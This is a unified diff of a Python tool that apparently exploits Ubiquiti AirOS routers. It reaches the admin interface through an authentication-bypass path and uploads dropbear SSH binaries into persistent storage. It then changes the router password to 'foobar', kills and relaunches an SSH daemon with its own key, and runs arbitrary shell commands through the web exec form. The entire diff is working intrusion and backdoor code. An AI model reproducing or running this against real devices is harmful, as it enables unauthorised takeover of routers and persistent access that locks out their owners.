@@ -30,6 +30,7 @@ class Airos(object):
         self.browser.open("http://" + ipaddr + "/admin.cgi/stuff.css")
         self.html = self.browser.response().read()
         self.bin_path = "bin/"
+        self.persistent_path = "/var/persistent/"
         self.upload_path = "/tmp/upload/"
         self.binaries_to_upload = ['dropbear', 'dropbearkey']
         self.username_ = False
@@ -45,14 +46,8 @@ class Airos(object):
         """
         for binary in self.binaries_to_upload:
             self.upload(binary)
-            self.exec_cmd(
-                'mv %s/%s /var/persistent/%s; chmod +x /var/persistent/%s' % (
-                    self.upload_path,
-                    binary, binary, binary
-                )
-            )
-            self.change_router_password("foobar")
-            self.launch_dropbear()
+        self.change_router_password("foobar")
+        self.launch_dropbear()
 
     @property
     def username(self):
@@ -89,11 +84,14 @@ class Airos(object):
         Simply executes dropbear
         """
         self.exec_cmd(
-            "[[ -e /var/sshd/lol.rsa ]] || " +
-            "./dropbearkey -t rsa -f /var/sshd/lol.rsa"
+            "[[ -e /tmp/lol.rsa ]] || " +
+            self.persistent_path +
+            "/dropbearkey -t rsa -f /tmp/lol.rsa"
         )
         self.exec_cmd(
-            "./dropbear -b /var/sshd/motd -r /var/sshd/lol.rsa;"
+            "kill `pidof dropbear`; " +
+            self.persistent_path +
+            "/dropbear -r /tmp/lol.rsa;"
         )
 
     def upload(self, binary):
@@ -108,11 +106,24 @@ class Airos(object):
             binary
         )
         self.browser.submit()
+        self.exec_cmd(
+            "mv %s/%s %s/%s" % (
+                self.upload_path, binary,
+                self.persistent_path, binary
+            )
+        )
+        self.exec_cmd("chmod +x " + self. persistent_path + "/" + binary)
 
     def exec_cmd(self, cmd):
         """
             Execute a command on the airos
         """
+        print cmd
+
         self.browser.select_form(nr=3)
-        self.browser.form['exec'] = cmd
+        self.browser.form['exec'] = "echo '" + cmd + "' >> /tmp/airos.log"
+        self.browser.submit()
+
+        self.browser.select_form(nr=3)
+        self.browser.form['exec'] = cmd + " &>> /tmp/airos.log"
         return self.browser.submit()
